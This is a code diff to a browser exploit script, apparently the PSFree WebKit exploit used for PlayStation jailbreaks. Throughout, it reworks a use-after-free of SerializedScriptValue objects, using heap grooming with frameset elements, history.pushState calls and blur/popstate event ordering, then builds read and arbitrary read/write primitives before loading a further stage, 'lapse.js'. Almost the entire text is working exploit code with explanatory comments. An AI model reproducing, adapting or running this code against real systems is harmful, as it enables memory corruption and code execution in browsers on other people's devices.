@@ -163,13 +163,17 @@ function prepare_uaf() {
         }
     }
 
-    history.pushState('state0', '');
+    // the first call to either replaceState/pushState is likely to allocate a
+    // JSC::IsoAlignedMemoryAllocator near the SSV it creates. this prevents
+    // the SmallLine where the SSV resides from being freed. so we do a dummy
+    // call first
+    history.replaceState('state0', '');
 
     alloc_fs(fsets, num_fsets);
 
-    // the "state1" SSVs is what we will UaF
+    // the "state1" SSVs is what we will UAF
 
-    history.pushState('state1', '', original_loc + '#foo');
+    history.pushState('state1', '', original_loc + '#bar');
     indices.push(fsets.length);
 
     alloc_fs(fsets, num_spaces);
@@ -177,7 +181,7 @@ function prepare_uaf() {
     history.pushState('state1', '', original_loc + '#foo');
     indices.push(fsets.length);
 
-    alloc_fs(fsets, num_fsets);
+    alloc_fs(fsets, num_spaces);
 
     history.pushState('state2', '');
     return [fsets, indices];
@@ -187,38 +191,63 @@ function prepare_uaf() {
 //
 // be careful when accessing history.state since History::state() will get
 // called. History will cache the SSV at its m_lastStateObjectRequested if you
-// do. that field is a RefPtr, thus preventing a UaF if we cache "state1"
-async function uaf_ssv(fsets, index, save_pop = false) {
+// do. that field is a RefPtr, thus preventing a UAF if we cache "state1"
+async function uaf_ssv(fsets, index, index2) {
     const views = [];
     const input = document.createElement('input');
-    input.style.position = 'absolute';
-    input.style.top = '-100px';
-    const foo = document.createElement('a');
+    input.id = 'input';
+    const foo = document.createElement('input');
     foo.id = 'foo';
-    foo.style.position = 'absolute';
-    foo.style.top = '-100px';
+    const bar = document.createElement('a');
+    bar.id = 'bar';
 
-    // debug_log(`ssv_len: ${hex(ssv_len)}`);
+    log(`ssv_len: ${hex(ssv_len)}`);
 
     let pop = null;
-    let num_blurs = 0;
-    const pop_promise = new Promise((resolve, reject) => {
-        function onpopstate(event) {
-            // debug_log('pop came');
-            if (num_blurs === 0) {
-                const r = reject;
-                r(new DieError(`pop came before blur. blurs: ${num_blurs}`));
-            }
-            pop = event;
-            resolve();
+    let pop2 = null;
+    let pop_promise2 = null;
+    let blurs = [0, 0];
+    let resolves = [];
+
+    function onpopstate(event) {
+        const no_pop = pop === null;
+        const idx = no_pop ? 0 : 1;
+
+        log(`pop ${idx} came`);
+        if (blurs[idx] === 0) {
+            const r = resolves[idx][1];
+            r(new DieError(`blurs before pop ${idx} came: ${blurs[idx]}`));
         }
-        addEventListener('popstate', onpopstate, { once: true });
+
+        if (no_pop) {
+            pop_promise2 = new Promise((resolve, reject) => {
+                resolves.push([resolve, reject]);
+                addEventListener('popstate', onpopstate, {once: true});
+                history.back();
+            });
+        }
+
+        if (no_pop) {
+            pop = event;
+        } else {
+            pop2 = event;
+        }
+        resolves[idx][0]();
+    }
+
+    const pop_promise = new Promise((resolve, reject) => {
+        resolves.push([resolve, reject]);
+        addEventListener('popstate', onpopstate, {once: true});
     });
 
-    function onblur() {
-        // debug_log('blur came');
-        if (num_blurs > 0) {
-            die(`multiple blurs. blurs: ${num_blurs}`);
+    function onblur(event) {
+        const target = event.target;
+        const is_input = target === input;
+        const idx = is_input ? 0 : 1;
+        log(`${target.id} blur came`);
+
+        if (blurs[idx] > 0)  {
+            die(`PSFree: multiple blurs. blurs: ${blurs[idx]}`);
         }
 
         // we replace the URL with the original so the user can rerun the
@@ -229,7 +258,8 @@ async function uaf_ssv(fsets, index, save_pop = false) {
 
         // free the SerializedScriptValue's neighbors and thus free the
         // SmallLine where it resides
-        for (let i = index - num_adjs / 2; i < index + num_adjs / 2; i++) {
+        const fset_idx = is_input ? index : index2;
+        for (let i = fset_idx - num_adjs/2; i < fset_idx + num_adjs/2; i++) {
             fsets[i].rows = '';
             fsets[i].cols = '';
         }
@@ -240,12 +270,15 @@ async function uaf_ssv(fsets, index, save_pop = false) {
             views.push(view);
         }
 
-        num_blurs++;
+        blurs[idx]++;
     }
+
     input.addEventListener('blur', onblur);
+    foo.addEventListener('blur', onblur);
 
     document.body.append(input);
     document.body.append(foo);
+    document.body.append(bar);
 
     // FrameLoader::loadInSameDocument() calls Document::statePopped().
     // statePopped() will defer firing of popstate until we're in the complete
@@ -253,7 +286,7 @@ async function uaf_ssv(fsets, index, save_pop = false) {
     //
     // this means that onblur() will run with "state2" as the current history
     // item if we call loadInSameDocument too early
-    // debug_log(`readyState now: ${document.readyState}`);
+    log(`readyState now: ${document.readyState}`);
 
     if (document.readyState !== 'complete') {
         await new Promise(resolve => {
@@ -266,43 +299,51 @@ async function uaf_ssv(fsets, index, save_pop = false) {
         });
     }
 
-    // debug_log(`readyState now: ${document.readyState}`);
+    log(`readyState now: ${document.readyState}`);
 
     await new Promise(resolve => {
-        input.addEventListener('focus', resolve, { once: true });
+        input.addEventListener('focus', resolve, {once: true});
         input.focus();
     });
 
     history.back();
     await pop_promise;
-    input.removeEventListener('blur', onblur);
+    await pop_promise2;
 
-    // debug_log('done await popstate');
+    log('done await popstate');
 
-    for (const [i, view] of views.entries()) {
+    input.remove();
+    foo.remove();
+    bar.remove();
+
+    const res = [];
+    for (let i = 0; i < views.length; i++) {
+        const view = views[i];
         if (view[0] !== 0x41) {
-            // debug_log(`view index: ${hex(i)}`);
-            // debug_log('found view:');
-            // debug_log(view);
-
-            input.remove();
-            foo.remove();
+            log(`view index: ${hex(i)}`);
+            log('found view:');
+            log(view);
 
             // set SSV's refcount to 1, all other fields to 0/NULL
             view[0] = 1;
             view.fill(0, 1);
 
-            if (save_pop) {
-                return [new BufferView(view.buffer), pop];
+            if (res.length) {
+                res[1] = [new BufferView(view.buffer), pop2];
+                break;
             }
 
             // return without keeping any references to pop, making it GC-able.
             // its WebCore::PopStateEvent will then be freed on its death
-            return new BufferView(view.buffer);
+            res[0] = new BufferView(view.buffer);
+            i = num_reuses - 1;
         }
     }
 
-    die('failed SerializedScriptValue UaF');
+    if (res.length !== 2) {
+        die('failed SerializedScriptValue UAF');
+    }
+    return res;
 }
 
 class Reader {
@@ -772,28 +813,13 @@ async function make_arw(reader, view2, pop) {
     make_arw._buffer = bt.buffer;
 }
 
-// UAF retry wrapper for improved stability with GoldHen v2.4b18.8
-async function uaf_ssv_with_retry(fsets, index, save_pop = false, maxRetries = 3) {
-    for (let attempt = 1; attempt <= maxRetries; attempt++) {
-        try {
-            return await uaf_ssv(fsets, index, save_pop);
-        } catch (e) {
-            if (attempt === maxRetries) throw e;
-            log(`UAF attempt ${attempt}/${maxRetries} failed, retrying...`);
-            gc();
-            await sleep(100);
-        }
-    }
-}
-
 async function main() {
     log('STAGE: UAF SSV');
     const [fsets, indices] = prepare_uaf();
-    const view = await uaf_ssv_with_retry(fsets, indices[1]);
+    const [view, [view2, pop]] = await uaf_ssv(fsets, indices[1], indices[0]);
 
     log('STAGE: get string relative read primitive');
     const rdr = await make_rdr(view);
-    const [view2, pop] = await uaf_ssv_with_retry(fsets, indices[0], true);
 
     for (const fset of fsets) {
         fset.rows = '';
@@ -804,7 +830,6 @@ async function main() {
     await make_arw(rdr, view2, pop);
 
     clear_log();
-    // path to your script that will use the exploit
     import('./lapse.js');
 }
 main();
